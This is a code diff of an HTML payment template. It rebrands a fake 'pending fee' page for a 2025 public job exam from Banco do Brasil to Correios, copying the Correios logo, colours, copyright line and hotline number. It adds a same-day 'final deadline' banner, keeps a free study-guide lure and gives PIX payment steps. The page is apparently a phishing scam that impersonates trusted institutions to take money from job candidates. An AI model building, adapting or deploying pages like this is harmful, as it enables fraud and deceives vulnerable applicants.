@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco do Brasil - Taxa Pendente</title>
+    <title>Correios - Taxa Pendente</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -32,8 +32,8 @@
             theme: {
                 extend: {
                     colors: {
-                        'bb-yellow': '#FEEF37',
-                        'bb-blue': '#003DA5',
+                        'correios-blue': '#003399',
+                        'correios-yellow': '#FEEF37',
                     }
                 }
             }
@@ -42,16 +42,16 @@
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
     <!-- Header -->
-    <div class="bg-bb-yellow py-4 shadow-sm">
+    <div class="bg-correios-yellow py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
+                <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png" alt="Logo dos Correios" class="h-12 mb-2" />
                 <div>
-                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                    <p class="text-correios-blue text-[16px] leading-tight font-bold tracking-wide">
                         CONCURSO PÚBLICO 2025
                     </p>
-                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
-                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
+                    <p class="text-correios-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA MÚLTIPLOS CARGOS
                     </p>
                 </div>
             </div>
@@ -59,7 +59,7 @@
     </div>
 
     <!-- Blue bar -->
-    <div class="bg-bb-blue py-3 shadow-md">
+    <div class="bg-correios-blue py-3 shadow-md">
         <div class="container mx-auto px-4 flex items-center">
             <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                 <div class="w-2 h-2 bg-white"></div>
@@ -75,8 +75,22 @@
     <div class="container mx-auto px-4 py-8 flex-grow">
         <div class="max-w-2xl mx-auto">
             <div class="bg-white rounded-lg shadow-md p-6">
+                <!-- Prazo Final Alert -->
+                <div class="bg-red-50 border-l-4 border-red-400 p-4 mb-6">
+                    <div class="flex">
+                        <div class="flex-shrink-0">
+                            <i class="fas fa-clock text-red-400"></i>
+                        </div>
+                        <div class="ml-3">
+                            <p class="text-sm text-red-700">
+                                <span class="font-bold">PRAZO FINAL:</span> {{ current_day }}/{{ current_month }}/{{ current_year }} às 23h59
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
                 <div class="mb-6">
-                    <h2 class="text-lg font-bold text-bb-blue mb-4">Dados do Candidato</h2>
+                    <h2 class="text-lg font-bold text-correios-blue mb-4">Dados do Candidato</h2>
 
                     <!-- Dados do Candidato -->
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
@@ -117,7 +131,7 @@
                     </div>
 
                     <!-- New Warning Box for Free Study Guide -->
-                    <div class="bg-bb-blue rounded-lg p-6 mb-6">
+                    <div class="bg-correios-blue rounded-lg p-6 mb-6">
                         <div class="flex flex-col items-center text-center">
                             <div class="mb-4">
                                 <i class="fas fa-gift text-white text-4xl"></i>
@@ -128,7 +142,7 @@
                                     <p>
                                         <span class="font-bold">NÃO FECHE</span> esta página após realizar o pagamento. 
                                         Aguarde o redirecionamento automático para receber <span class="font-bold">GRATUITAMENTE</span> 
-                                        sua Apostila de Estudos do Concurso Banco do Brasil 2025.
+                                        sua Apostila de Estudos do Concurso Correios 2025.
                                     </p>
                                     <p class="font-bold">
                                         Este material exclusivo irá aumentar significativamente suas chances de aprovação!
@@ -168,19 +182,19 @@
                     <!-- Instruções de Pagamento -->
                     <div class="space-y-4">
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-bb-blue text-white flex items-center justify-center mr-3">1</div>
+                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">1</div>
                             <span>Abra o app do seu banco</span>
                         </div>
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-bb-blue text-white flex items-center justify-center mr-3">2</div>
+                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">2</div>
                             <span>Escolha pagar via PIX</span>
                         </div>
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-bb-blue text-white flex items-center justify-center mr-3">3</div>
+                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">3</div>
                             <span>Escaneie o QR Code ou cole o código PIX</span>
                         </div>
                         <div class="flex items-center">
-                            <div class="w-8 h-8 rounded-full bg-bb-blue text-white flex items-center justify-center mr-3">4</div>
+                            <div class="w-8 h-8 rounded-full bg-correios-blue text-white flex items-center justify-center mr-3">4</div>
                             <span>Confirme o valor e finalize o pagamento</span>
                         </div>
                     </div>
@@ -190,9 +204,9 @@
     </div>
 
     <!-- Footer -->
-    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
-        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
-        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
+    <div class="bg-correios-yellow text-correios-blue text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© {{ current_year }} Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento dos Correios - 0800 725 0100</p>
     </div>
 
     <script>
